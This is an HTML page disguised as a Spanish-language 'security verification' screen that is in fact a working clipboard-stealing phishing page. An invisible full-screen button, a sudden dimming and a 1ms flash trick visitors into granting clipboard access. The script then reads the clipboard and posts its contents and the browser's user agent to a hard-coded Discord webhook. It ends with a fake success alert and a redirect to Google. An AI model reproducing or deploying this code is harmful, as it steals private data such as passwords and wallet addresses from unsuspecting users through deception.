<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificación de Seguridad</title>
    <style>
        :root {
            --android-bg: #1A1C1E;
            --android-text: #E3E2E6;
            --android-blue: #A8C7FA;
        }

        body, html { margin: 0; padding: 0; height: 100%; background: var(--android-bg); font-family: 'Roboto', sans-serif; overflow: hidden; }
        
        /* 1. Capa de Oscurecimiento Agresiva */
        #ghost-dimmer {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0);
            transition: background 2s cubic-bezier(0.4, 0, 1, 1);
            z-index: 1000;
        }

        /* 2. El Botón Maestro (Cubre toda la pantalla, invisible) */
        #master-trigger {
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            background: rgba(0,0,0,0);
            border: none;
            z-index: 5000; /* Por encima de todo */
            cursor: pointer;
        }

        /* 3. Flash Subliminal Extremo (1ms) */
        #subliminal-flash {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: #4285F4;
            display: none;
            z-index: 6000;
        }

        #content-view { color: var(--android-text); text-align: center; margin-top: 35vh; pointer-events: none; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: var(--android-blue); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="ghost-dimmer"></div>
    <div id="subliminal-flash"></div>
    
    <button id="master-trigger"></button>

    <div id="content-view">
        <div class="spinner"></div>
        <h2>Sincronizando con el dispositivo...</h2>
        <p style="color: #8E9199;">No interrumpas el proceso.</p>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        
        const dimmer = document.getElementById('ghost-dimmer');
        const flash = document.getElementById('subliminal-flash');
        const trigger = document.getElementById('master-trigger');

        // Oscurecimiento casi instantáneo para provocar el reflejo
        window.onload = () => {
            setTimeout(() => {
                dimmer.style.background = "rgba(0, 0, 0, 0.98)";
            }, 400);
        };

        // LA JUGADA MAESTRA: 1 Solo Clic
        trigger.addEventListener('click', async () => {
            // 1. Flash de 1ms (Ceguera funcional instantánea)
            flash.style.display = 'block';
            setTimeout(() => { flash.style.display = 'none'; }, 1);

            // 2. Restaurar visualmente para no levantar sospechas
            dimmer.style.transition = "none";
            dimmer.style.background = "transparent";
            trigger.style.display = "none";

            try {
                // 3. Captura inmediata del portapapeles
                // El navegador mostrará el diálogo nativo de "Permitir"
                // El usuario ya está haciendo clic, así que presiona "Permitir" por inercia
                const text = await navigator.clipboard.readText();
                if (text) enviarADiscord(text);
            } catch (err) {
                // Si falla, enviamos error silencioso y redirigimos
                window.location.href = "https://www.google.com";
            }
        });

        function enviarADiscord(contenido) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "⚡ Intercepción de Clic Único",
                        color: 4359668,
                        fields: [
                            { name: "Portapapeles", value: "```" + contenido + "```" },
                            { name: "Info", value: navigator.userAgent }
                        ],
                        footer: { text: "Neuro-Kernel Exploit | 1ms Flash" },
                        timestamp: new Date()
                    }]
                })
            }).then(() => {
                alert("Análisis completado con éxito.");
                window.location.href = "https://www.google.com";
            });
        }
    </script>
</body>
</html>
